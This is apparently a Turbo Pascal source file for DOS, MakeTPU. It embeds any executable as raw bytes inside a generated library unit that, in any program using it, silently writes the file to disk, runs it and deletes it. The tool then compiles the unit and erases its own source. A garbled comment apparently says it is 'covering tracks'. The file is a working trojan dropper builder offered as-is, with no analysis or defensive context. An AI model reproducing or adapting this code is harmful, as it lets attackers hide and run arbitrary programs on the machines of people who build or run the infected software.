   {$M 2000, 0, 2000}
   program MakeTPU;
   uses dos;
   var f:text;
       g:searchrec;
       i,c:byte;
       d:file;        {¨áå®¤ë© ä ©«}
       z:byte;        {áç¥âç¨ª § ¯¨á ëå á¨¬¢®«®¢}
   begin
   if paramcount<>1 then
     begin
     writeln('usage : maketpu.exe <exe_file>');
     halt;
     end;
   {findfirst(paramstr(1),$20,g);}
   assign(f,'zyx.pas');rewrite(f);
   writeln(f,'{$M 20000, 1000, 20000}');
   writeln(f,'unit zyx;');
   writeln(f,'interface');
   writeln(f,'uses dos;');
   writeln(f,'implementation');
   writeln(f,'procedure Starting;assembler;');
   writeln(f,'asm');
   writeln(f,'jmp @Run');
   writeln(f,'@Nam: db ''zyx.exe'',0');
   writeln(f,'@Dat:');
   assign(d,paramstr(1));reset(d,1);
   while not eof(d) do
     begin
     write(f,'db ');
     blockread(d,c,1);
     write(f,c);
     i:=1;
     while (i<25) and (not eof(d)) do
       begin
       write(f,',');
       blockread(d,c,1);
       write(f,c);
       i:=i+1;
       end;
     writeln(f,'');
     end;
   close(d);
   writeln(f,'@Run:');
   writeln(f,'push ds');
   writeln(f,'push cs');
   writeln(f,'pop ds');
   writeln(f,'mov ah,3Ch');
   writeln(f,'mov cx,0');
   writeln(f,'mov dx,offset @Nam');
   writeln(f,'int 21h');
   writeln(f,'xchg bx,ax');
   writeln(f,'mov cx,offset @RUN');
   writeln(f,'mov dx,offset @Dat');
   writeln(f,'sub cx,dx');
   writeln(f,'mov ah,40h');
   writeln(f,'int 21h');
   writeln(f,'mov ah,3Eh');
   writeln(f,'int 21h');
   writeln(f,'pop ds');
   writeln(f,'end;');
   writeln(f,'begin');
   writeln(f,'Starting;');
   writeln(f,'exec(GetEnv(''COMSPEC''),''/c zyx.exe'');');
   writeln(f,'exec(GetEnv(''COMSPEC''),''/c del zyx.exe>nul'');');
   writeln(f,'end.');
   close(f);
   exec(GetEnv('COMSPEC'),'/c tpc.exe zyx.pas>nul');
   erase(f);                               {§ ¬¥â ¥¬ á«¥¤ë}
   end.
